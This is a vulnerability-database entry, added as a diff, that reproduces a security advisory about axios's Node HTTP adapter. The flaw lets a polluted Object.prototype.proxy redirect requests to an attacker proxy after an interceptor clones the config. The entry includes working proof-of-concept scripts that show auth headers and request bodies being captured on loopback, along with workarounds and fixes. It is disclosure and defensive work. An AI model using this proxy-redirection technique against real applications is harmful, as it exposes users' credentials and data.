@@ -1,0 +1,445 @@
+[basic]
+description = '''
+## Summary
+
+Axios’ Node.js HTTP adapter can route requests through an attacker-controlled proxy when `Object.prototype.proxy` is polluted and request configuration is materialized as a regular object before dispatch.
+
+Recent axios releases harden merged request config by creating a null-prototype object. However, request interceptors run after that merge and may return a replacement config. A common immutable interceptor pattern such as `{...config}` or `Object.assign({}, config)` converts the hardened config back into a normal object. Axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads `config.proxy` through the prototype chain.
+
+## Impact
+
+In a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can route affected HTTP requests through an attacker-controlled proxy.
+
+The highest confirmed impact is for plaintext HTTP requests. The proxy can observe explicit `Authorization` headers, axios-generated Basic auth from `config.auth`, request method, absolute URL, `Host`, and request body content. The proxy can also return its own response to axios for the affected request.
+
+This does not establish browser impact. It also does not establish HTTPS header or body disclosure under normal TLS validation.
+
+## Affected Functionality
+
+Affected functionality is limited to axios requests that use the Node.js HTTP adapter, including default Node usage when the HTTP adapter is selected and explicit `adapter: 'http'` usage.
+
+The relevant configuration path is `config.proxy` in the Node HTTP adapter. The hardened-bypass path requires a request interceptor such as:
+
+```js
+api.interceptors.request.use((config) => ({
+  ...config,
+  headers: {
+    ...config.headers,
+    'X-App': 'demo'
+  }
+}));
+```
+
+Unaffected or mitigating conditions include browser adapters, the Node fetch adapter, no polluted `Object.prototype.proxy`, an own `proxy: false` or safe own `proxy` value on the config, and hardened releases where interceptors return the original null-prototype config instead of a regular object clone.
+
+## Technical Details
+
+`lib/core/mergeConfig.js` creates a null-prototype merged config and uses own-property reads for merged values. This is intended to prevent polluted `Object.prototype` values from affecting config behavior.
+
+`lib/core/Axios.js` runs request interceptors after the merge. In both the asynchronous and synchronous interceptor paths, axios passes the interceptor-returned config into dispatch.
+
+`lib/core/dispatchRequest.js` accepts that returned config, transforms request data, selects the adapter, and calls the adapter without re-hardening or re-normalizing the config.
+
+`lib/adapters/http.js` uses own-property reads for several sensitive fields, but the initial proxy dispatch path still passes `config.proxy` directly into `setProxy()`. If an interceptor returned a regular object, `config.proxy` can resolve to inherited `Object.prototype.proxy`.
+
+## Proof of Concept of Attack
+
+```js
+import axios from './index.js';
+import http from 'node:http';
+
+for (const key of [
+  'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',
+  'http_proxy', 'https_proxy', 'all_proxy',
+  'NO_PROXY', 'no_proxy'
+]) {
+  delete process.env[key];
+}
+
+const listen = (handler) => new Promise((resolve, reject) => {
+  const server = http.createServer(handler);
+  server.once('error', reject);
+  server.listen(0, '127.0.0.1', () => resolve(server));
+});
+
+const close = (server) => new Promise((resolve) => server.close(resolve));
+
+const targetHits = [];
+const proxyHits = [];
+
+const target = await listen((req, res) => {
+  targetHits.push(req.url);
+  res.end('target');
+});
+
+const proxy = await listen((req, res) => {
+  let body = '';
+  req.on('data', (chunk) => body += chunk);
+  req.on('end', () => {
+    proxyHits.push({
+      url: req.url,
+      authorization: req.headers.authorization,
+      host: req.headers.host,
+      body
+    });
+    res.setHeader('content-type', 'application/json');
+    res.end('{\"server\":\"proxy\"}');
+  });
+});
+
+Object.prototype.proxy = {
+  protocol: 'http',
+  host: '127.0.0.1',
+  port: proxy.address().port
+};
+
+const api = axios.create();
+
+api.interceptors.request.use((config) => ({
+  ...config,
+  headers: {
+    ...config.headers,
+    'X-App': 'demo'
+  }
+}));
+
+try {
+  const url = `http://127.0.0.1:${target.address().port}/api/secret`;
+
+  const res = await api.post(
+    url,
+    {secret: 'request-body-secret'},
+    {headers: {Authorization: 'Bearer EXPLICIT_SECRET'}}
+  );
+
+  console.log({
+    response: res.data,
+    targetHits,
+    proxyHits,
+    finalConfigHasOwnProxy: Object.hasOwn(res.config, 'proxy')
+  });
+} finally {
+  delete Object.prototype.proxy;
+  await close(target);
+  await close(proxy);
+}
+```
+
+Expected vulnerable result: the response comes from the proxy, `targetHits` is empty, and `proxyHits` contains the absolute URL, authorization header, host header, and request body.
+
+## Workarounds
+
+Set an own `proxy: false` on affected requests or on an axios instance when proxy support is not required.
+
+Avoid request interceptors that return regular object clones of config in hardened releases. Returning the original config or cloning into a null-prototype object avoids this specific bypass, but this is fragile and should not replace a fix.
+
+Use the Node fetch adapter for affected requests where its behavior is compatible with the application.
+
+<details>
+<summary>Original Report</summary>
+
+## Summary
+
+  Axios hardens merged request config by creating a null-prototype object, preventing polluted Object.prototype properties from influencing request behavior. Request interceptors run after that hardening, and a normal immutable
+  interceptor pattern such as {...config} or Object.assign({}, config) re-materializes the config as a regular object. Axios then dispatches that interceptor-returned object without re-hardening it. In the Node HTTP adapter, config.proxy
+  is read through the prototype chain, allowing a polluted Object.prototype.proxy to route authenticated HTTP requests through an attacker-controlled proxy.
+
+  ## Impact
+
+  In a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can cause affected axios requests to be sent through an attacker-controlled proxy when the application uses a
+  request interceptor that returns a plain object copy of the config.
+
+  Verified local impact:
+
+  - Authenticated request redirection to attacker-controlled proxy.
+  - Disclosure of explicit Authorization headers.
+  - Disclosure of axios-generated Basic auth headers from config.auth.
+  - Disclosure of request metadata: method, absolute URL, Host header.
+  - Disclosure of POST body content.
+
+  This report does not claim browser impact or proven HTTPS credential disclosure. The demonstrated credential and body disclosure is for Node HTTP-adapter requests over HTTP/plaintext.
+
+  ## Affected component
+
+  The affected component is the Node.js HTTP adapter request path after request interceptors have run.
+
+  The issue requires:
+
+  - Node.js HTTP adapter usage.
+  - A polluted Object.prototype.proxy.
+  - A request interceptor that returns a plain object copy of the config.
+  - No own proxy: false or safe own proxy property on the request config.
+
+  ## Affected versions
+
+  Confirmed affected for this specific hardening-bypass variant:
+
+  - axios@1.15.2
+  - axios@1.16.0
+
+  axios@1.16.0 was the latest published version observed via npm view axios version during validation.
+
+  Related older behavior observed during testing:
+
+  - 1.13.0, 1.13.6, 1.14.0, 1.15.0, and 1.15.1 routed via inherited Object.prototype.proxy even without the interceptor re-materialization step. That is related background, not the narrowed hardening-bypass variant described here.
+
+  ## Root cause
+
+  1. Initial hardening
+
+     Axios initially hardens merged request config by creating a null-prototype object in mergeConfig(), which is meant to prevent inherited Object.prototype properties from influencing request behavior.
+     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25
+  2. Interceptor re-materialization
+
+     Request interceptors run after that hardening step, and axios allows an interceptor to return a replacement config object. A common immutable pattern such as {...config} or Object.assign({}, config) converts the hardened null-
+     prototype config back into a normal object with Object.prototype as its prototype.
+     Permalinks: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199, https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218
+  3. No post-interceptor re-hardening
+
+     Axios passes the interceptor-returned config into request dispatch without restoring the null-prototype property or otherwise normalizing the object into an own-property-only structure.
+     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48
+  4. Prototype-chain read of proxy in the Node adapter
+
+     The Node HTTP adapter later consults config.proxy, and this read is reachable through the prototype chain once the interceptor has re-materialized the config as a normal object. As a result, a polluted Object.prototype.proxy can
+     redirect the outgoing authenticated request through an attacker-controlled proxy.
+     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820
+
+  ## Why this is a security issue and not intended behavior
+
+  Axios’ threat model explicitly treats polluted Object.prototype config reads as high-impact read-side gadgets and states that axios defends reachable config-read gadgets through own-property checks and null-prototype structures. The
+  existing regression tests also assert that a polluted Object.prototype.proxy must not route requests through an attacker proxy.
+
+  This behavior is therefore a bypass of axios’ existing prototype-pollution hardening, not merely a generic “polluted process” complaint. The interceptor does not need to be malicious; it can be ordinary application code that returns an
+  immutable copy of the config. The attacker-controlled piece is the polluted prototype property supplied by a separate vulnerability or dependency.
+
+  ## Realistic threat model
+
+  A realistic exploit chain is:
+
+  1. A transitive dependency or upstream parser bug allows prototype pollution in a Node.js process.
+  2. The polluted property is Object.prototype.proxy, with host and port pointing to an attacker-controlled proxy.
+  3. The application uses axios with a request interceptor that returns a plain object copy, such as adding headers immutably.
+  4. The application sends an HTTP request with credentials or sensitive body data.
+  5. Axios routes that request through the inherited proxy configuration.
+
+  This requires a prototype pollution primitive and a compatible interceptor pattern. It does not require the attacker to control the interceptor.
+
+  ## Proof of concept
+
+  Save as poc.mjs in the axios repository root:
+
+```js
+  import axios from './index.js';
+  import http from 'node:http';
+
+  const proxyEnvKeys = [
+    'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',
+    'http_proxy', 'https_proxy', 'all_proxy',
+    'NO_PROXY', 'no_proxy'
+  ];
+
+  for (const key of proxyEnvKeys) delete process.env[key];
+
+  const listen = (handler) => new Promise((resolve, reject) => {
+    const server = http.createServer(handler);
+    server.once('error', reject);
+    server.listen(0, '127.0.0.1', () => resolve(server));
+  });
+
+  const close = (server) => new Promise((resolve) => server.close(resolve));
+
+  const targetHits = [];
+  const proxyHits = [];
+
+  const target = await listen((req, res) => {
+    let body = '';
+    req.on('data', (chunk) => body += chunk);
+    req.on('end', () => {
+      targetHits.push({
+        url: req.url,
+        method: req.method,
+        authorization: req.headers.authorization || null,
+        body
+      });
+      res.writeHead(200, {'Content-Type': 'application/json'});
+      res.end(JSON.stringify({server: 'target'}));
+    });
+  });
+
+  const proxy = await listen((req, res) => {
+    let body = '';
+    req.on('data', (chunk) => body += chunk);
+    req.on('end', () => {
+      proxyHits.push({
+        url: req.url,
+        method: req.method,
+        authorization: req.headers.authorization || null,
+        host: req.headers.host || null,
+        body
+      });
+      res.writeHead(200, {'Content-Type': 'application/json'});
+      res.end(JSON.stringify({server: 'proxy'}));
+    });
+  });
+
+  Object.prototype.proxy = {
+    protocol: 'http',
+    host: '127.0.0.1',
+    port: proxy.address().port
+  };
+
+  const api = axios.create();
+
+  api.interceptors.request.use((config) => ({
+    ...config,
+    headers: {
+      ...config.headers,
+      'X-App': 'demo'
+    }
+  }));
+
+  try {
+    const url = `http://127.0.0.1:${target.address().port}/api/secret`;
+
+    const explicit = await api.get(url, {
+      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}
+    });
+
+    proxyHits.length = 0;
+    targetHits.length = 0;
+
+    const basic = await api.get(url, {
+      auth: {username: 'svc-account', password: 'prod-secret'}
+    });
+
+    proxyHits.length = 0;
+    targetHits.length = 0;
+
+    const post = await api.post(url, {secret: 'request-body-secret'}, {
+      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}
+    });
+
+    console.log(JSON.stringify({
+      explicitResponse: explicit.data,
+      basicResponse: basic.data,
+      postResponse: post.data,
+      targetHits,
+      proxyHits,
+      finalConfigPrototype:
+        Object.getPrototypeOf(post.config) === Object.prototype
+          ? 'Object.prototype'
+          : 'other',
+      finalConfigHasOwnProxy:
+        Object.prototype.hasOwnProperty.call(post.config, 'proxy')
+    }, null, 2));
+  } finally {
+    delete Object.prototype.proxy;
+    await close(target);
+    await close(proxy);
+  }
+```
+
+  Run:
+```bash
+  npm ci
+  node poc.mjs
+```
+
+  ## Observed results
+
+  Representative observed output from local loopback testing:
+
+```text
+
+  {
+    \"explicitResponse\": {\"server\": \"proxy\"},
+    \"basicResponse\": {\"server\": \"proxy\"},
+    \"postResponse\": {\"server\": \"proxy\"},
+    \"targetHits\": [],
+    \"proxyHits\": [
+      {
+        \"url\": \"http://127.0.0.1:40613/api/secret\",
+        \"method\": \"POST\",
+        \"authorization\": \"Bearer EXPLICIT_SECRET\",
+        \"host\": \"127.0.0.1:40613\",
+        \"body\": \"{\\"secret\\":\\"request-body-secret\\"}\"
+      }
+    ],
+    \"finalConfigPrototype\": \"Object.prototype\",
+    \"finalConfigHasOwnProxy\": false
+  }
+
+  Additional validation showed axios-generated Basic auth is also disclosed to the proxy:
+
+  {
+    \"authorization\": \"Basic c3ZjLWFjY291bnQ6cHJvZC1zZWNyZXQ=\"
+  }
+
+```
+
+  That value decodes to:
+
+  svc-account:prod-secret
+
+  Negative controls were also tested:
+
+  - No interceptor: target receives request, proxy receives none.
+  - Interceptor mutating and returning the same config object: proxy receives none.
+  - Own proxy: false: proxy receives none.
+  - Null-prototype clone interceptor: proxy receives none.
+  - Fetch adapter in Node with the same interceptor: proxy receives none.
+
+  ## Suggested remediation
+
+  Re-harden the final request config after all request interceptors and before adapter dispatch. This should cover both asynchronous and synchronous interceptor paths.
+
+  A practical fix would be to normalize the interceptor-returned object into a null-prototype, own-property-only config before calling dispatchRequest(), or at the start of dispatchRequest() itself. Security-sensitive adapter reads should
+  also consistently use own-property access helpers. In particular, the Node HTTP adapter should not read config.proxy through the prototype chain.
+
+  ## Minimal regression test
+
+  Add an end-to-end Node HTTP adapter test that:
+
+  1. Starts a target server and attacker proxy on 127.0.0.1.
+  2. Sets Object.prototype.proxy to the attacker proxy.
+  3. Adds a request interceptor returning {...config, headers: {...config.headers}}.
+  4. Sends a request with an Authorization header.
+  5. Asserts the target server receives the request.
+  6. Asserts the attacker proxy receives no request.
+  7. Asserts the final config no longer exposes inherited proxy.
+
+  A second assertion can cover config.auth to ensure axios-generated Basic auth is not sent to the attacker proxy.
+
+  ## References / permalinks
+
+  - mergeConfig() null-prototype hardening: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25
+  - Async interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199
+  - Synchronous interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218
+  - dispatchRequest() receives interceptor-returned config: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48
+  - Node HTTP adapter config.proxy read: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820
+  - Axios threat model for prototype-pollution read-side gadgets: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/THREATMODEL.md#L136-L144
+  - Existing proxy pollution regression test intent: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/tests/unit/prototypePollution.test.js#L1098-L1135
+</details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-gcfj-64vw-6mp9"]
+ave_id = "AVE-2026-1107"
+
+[meta]
+collected_at = "2026-08-06T04:15:51.250441627+00:00"
+status = "completed"
+
+[references]
+urls = []
